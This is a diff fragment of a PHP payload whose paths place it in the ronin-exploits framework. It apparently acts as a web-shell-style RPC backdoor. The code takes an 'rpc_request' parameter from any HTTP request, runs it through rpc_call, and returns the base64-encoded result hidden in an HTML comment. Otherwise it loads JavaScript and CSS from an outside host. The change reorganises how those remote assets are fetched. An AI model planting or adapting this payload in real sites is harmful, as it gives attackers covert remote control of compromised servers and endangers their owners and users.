@@ -281,9 +281,7 @@ function rpc_call($request)
   else                       { return Array('value' => $value); }
 }
 
-define('RPC_JS_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payloads/php/rpc.js');
-
-echo('<script type="text/javascript" src="' . RPC_JS_URL . '"></script>');
+define('RPC_BASE_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payloads/php/rpc');
 
 if (isset($_REQUEST['rpc_request']))
 {
@@ -292,7 +290,12 @@ if (isset($_REQUEST['rpc_request']))
 
   $response = base64_encode(json_encode(rpc_call($request)));
 
-  echo("<!-- <rpc-response>{$response}</rpc-response> -->");
+  echo "<!-- <rpc-response>{$response}</rpc-response> -->";
+}
+else
+{
+  echo '<link rel="stylesheet" type="text/css" href="' . RPC_BASE_URL . '.css" />';
+  echo '<script type="text/javascript" src="' . RPC_BASE_URL . '.js"></script>';
 }
 
 ?>
